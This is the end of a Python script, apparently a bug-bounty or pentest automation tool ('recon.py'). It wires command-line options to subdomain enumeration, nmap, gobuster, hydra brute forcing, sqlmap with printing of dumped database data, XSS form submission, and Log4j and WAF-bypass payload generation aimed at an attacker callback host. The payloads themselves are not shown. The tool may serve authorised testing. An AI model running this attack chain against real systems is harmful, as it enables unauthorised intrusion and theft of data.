parser.add_argument("--log4j", nargs='?', metavar="URL", help='Run log4j scanner on file: \033[92m\033[1mlog4jtargs\033[0m (python3 recon.py --log4j) OR single URL: (python3 recon.py --log4j $URL)')
parser.add_argument("--sqlmap", nargs='?', metavar="URL", help='Run SQLMap on file: \033[92m\033[1mSQLMAPTargets\033[0m (python3 recon.py --sqlmap) or single URL (python3 recon.py --sqlmap $url)')
parser.add_argument("--nmap", nargs='?', metavar="DOMAIN", help='Run NMAP and(or) Masscan on file: \033[92m\033[1mNMAPTargets\033[0m (python3 recon.py --nmap) OR single domain: (python3 recon.py --nmap $domain)')
parser.add_argument("--urlstatus", nargs='?', metavar="FILE", help='Check URL status on file: \033[92m\033[1mdedupedTargets\033[0m (python3 recon.py --urlstatus) OR single file: (python3 recon.py --urlstatus $file) (Data goes to seperate files)')
parser.add_argument("--waybackurls", nargs='?', metavar="DOMAIN", help='Run waybackurls on file: \033[92m\033[1mtargetDomains\033[0m (python3 recon.py --waybackurls) OR single URL: (python3 recon.py --waybackurls $url)')
parser.add_argument("--sublister", nargs='?', metavar="DOMAIN", help='Run Subl1st3r on file: \033[92m\033[1mtargetDomains\033[0m (python3 recon.py --sublister) OR single domain: (python3 recon.py --sublister $domain)')
parser.add_argument("--amass", nargs='?', metavar="DOMAIN", help='Run amass on file: \033[92m\033[1mtargetDomains\033[0m (python3 recon.py --amass) OR single domain: (python3 recon.py --amass $domain)')
parser.add_argument("--subbrute", nargs='?', metavar="DOMAIN", help='Run subbrute on file: \033[92m\033[1mtargetDomains\033[0m (python3 recon.py --subbrute) OR single domain: (python3 recon.py --subbrute $domain)')
parser.add_argument("--gobuster", nargs='?', metavar="DOMAIN", help='Run gobuster on file: \033[92m\033[1mtargetDomains\033[0m (python3 recon.py --gobuster) OR single domain: (python3 recon.py --gobuster $domain)') #Run by itself as of now, data isn't deduped (can be misleading with 200' as well
parser.add_argument("--xss", nargs='?', metavar="URL", help='Run XSS attack on file: \033[92m\033[1mtargetsWithCodes200\033[0m (python3 recon.py --xss) OR single URL: (python3 recon.py --xss $url) (xss hunter payloads are required from payloads.py)')
parser.add_argument("--hydra", metavar='[target.com or IP]', help='Run hydra on user supplied target URL (Ensure payloads are configured in function)')
parser.add_argument("--bypass403", action='store_false', help='Run 403 bypasses on file: \033[92m\033[1mtargetsWithCodes403\033[0m (Output on screen only. These tests should be done manually with BurpSuite 403 bypass extension!)')
parser.add_argument("--formsubmit", nargs='?', metavar="URL", help='Submit XSS payload to single URL (python3 recon.py --formsubmit $url) \033[92m\033[1mBatch runtime use XSS and Log4j modules\033[0m')
parser.add_argument("--urlfuzz", action='store_false', help='Required file: \033[92m\033[1mfuzzUrlTargs\033[0m Fuzz url inputs from file replacing keyword "hoopety" with payload\033[31;1;92m manually\033[0m first (xss & log4j payloads are used)')
parser.add_argument("--wpscan", nargs='?', metavar="URL", help='Run WPScan on file: \033[92m\033[1mwordpressTargs\033[0m (python3 recon.py --wpscan) OR single URL: (python3 recon.py --wpscan $url)')
parser.add_argument("--genpayloads", metavar="[LISTENER]", help='Enter callback_host or listener') #Pass protocol (dns, rmi, ldap) add this to this
parser.add_argument("--removeunwanted", metavar="[FILE]", help='Remove .img, .png, .pdf, .css, .js from a file. Remember to check out the full waybackurls file for .js and other files for manual testing')
parser.add_argument("--createfiles", action='store_false', help='Create files not auto generated, ensure your log directory is set')
parser.add_argument("--addhttps", metavar="[FILE]", help='Adds https to domains in specified file')
parser.add_argument("--test", action='store_false', help='Currently holds WAF Bypass payloads')
args = parser.parse_args()


def main():
    try:
       opts, args = getopt.getopt(sys.argv[1:],"hi:", 
            ["help", "recon-passive", "recon-active", "attack", "recon-attack", "xss-log4j", "log4j", "sqlmap", "nmap", "urlstatus", "waybackurls", "sublister", "amass", "subbrute", "gobuster", "xss", "hydra", "bypass403", "formsubmit", "urlfuzz", "wpscan", "genpayloads", "removeunwanted", "createfiles", "addhttps", "test"])
    
    except getopt.GetoptError:
      sys.exit(2)

    for opt, arg in opts:
        if opt == ("--recon-passive"):
            wayBackURLs()
            sublist3r()
            amass()
            subbrute()

        elif opt == ("--recon-active"):
            wayBackURLs()
            sublist3r()
            amass()
            subbrute()
            URLStatus()

        elif opt == ("--attack"):
            XSS()
            log4j()
            sqlmap()
            
        elif opt == ("--recon-attack"):
            wayBackURLs()
            sublist3r()
            amass()
            subbrute()
            URLStatus()
            XSS()
            log4j()
            sqlmap()
        
        elif opt == ("--xss-log4j"):
            XSS()
            log4j()

        elif opt == ("--log4j"):
            if args == []:
                log4j()
            else:
                log4j(args[0])

        elif opt == ("--sqlmap"):
            if args == []:
                sqlmap()
            else:
                sqlmap(args[0])
            cprint("Check these dirs for SQL Dump Data: ", "red")
            os.system("ls -d ~/.local/share/sqlmap/output/*/dump/")
            cprint("\nDUMPED DATA: ", "red")
            os.system("cat ~/.local/share/sqlmap/output/*/dump/*") 
            time.sleep(5)

        elif opt == ("--nmap"):
            if args == []:
                nmap()
            else:
                nmap(args[0])

        elif opt == ("--urlstatus"):
            if args == []:
                URLStatus()
            else:
                URLStatus(args[0])

        elif opt == ("--waybackurls"):
            if args == []:
                wayBackURLs()
            else:
                wayBackURLs(args[0])

        elif opt == ("--sublister"):
            if args == []:
                sublist3r()
            else:
                sublist3r(args[0])

        elif opt == ("--amass"):            
            if args == []:
                amass()
            else:
                amass(args[0])

        elif opt == ("--subbrute"):            
            if args == []:
                subbrute()
            else:
                subbrute(args[0])

        elif opt == ("--gobuster"):
            if args == []:
                goBuster()
            else:
                goBuster(args[0])

        elif opt == ("--xss"):            
            if args == []:
                XSS()
            else:
                XSS(args[0])

        elif opt == ("--hydra"):    #Get it to take payload from command line and work on getting it to verify http or https, if get bored or is it needed?
            hydra(args[0])

        elif opt == ("--bypass403"):
            bypass403()

        elif opt == ("--formsubmit"):
            cprint("Grabbing payload[0] from xsspayloads in payloads.py", "green")
            cprint("To run with another payload; python3 recon.py --formsubmit $url, xsspayloads[1]", "green")
            sleep(2)
            formSubmit(args[0])

        elif opt == ("--urlfuzz"):
            fuzzUrls()

        elif opt == ("--wpscan"):
            if args == []:
                wpscan()
            else:
                wpscan(args[0])

        elif opt == ("--genpayloads"):
            callback_attacker = args[0]
            cprint(generate_header_payloads("dns", callback_attacker, "vulnerable"), "yellow")
            for i in generate_waf_bypass_payloads(callback_attacker, "vulnerable"):
                cprint(i, "green")
            for i in xsspayloads:
                cprint(i, "magenta")

            cprint("\n#########", "red")
            cprint("yellow = header payload", "yellow")
            cprint("green = waf bypass payloads", "green")
            cprint("magenta = xss payloads", "magenta")
            cprint("#########", "red")
            
        
        elif opt == ("--removeunwanted"):
            removeUnwanted(args[0])

        elif opt == ("--createfiles"):
            createFiles()

        elif opt == ("--addhttps"):
            addHttps(args[0])

        elif opt == ("--test"):
            test("localhost", "vuln")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt Detected.")
        print("Exiting...")
        exit(0)


# if path.exists('ar3/thirdparty/impacket/setup.py'):
#     system("cd ar3/thirdparty/impacket/;python3 setup.py install")
# else:
#     print("[!] Error installing impacket library, which may cause errors in ActiveReign")
#     print("[*] Consider rerunning, or install manually at:")
#     print("        https://github.com/SecureAuthCorp/impacket")



# cprint("\n\n####\nToDo\n####", "red")
# cprint("Fix the duplicate with the replace like gobuster or waybackurls (<-- they are tagged with)", "red")
# cprint("Get all forms in the form_submitter.py file (There is a comment)", "red")
# cprint("Add a `help` option to modules that run tools for easier syntax help (check subbrute)", "green")
# cprint("log4j() && xss() be like livURLS so it can auto create files if not exist", "red")
# cprint("sqlmap() be like livURLS so it can auto create files if not exist based of a grep of ?= or something for a batch", "green")
# cprint("maybe get rid of createfiles function and have it autogenerate each file if not exist, won't know anything on the target anyway", "red")
# cprint("work on urlfuzz module to get it to auto generate a target file, if possible", "green")
# cprint("have submit forms use selenium to hit submit", "red")
# cprint("####", "red")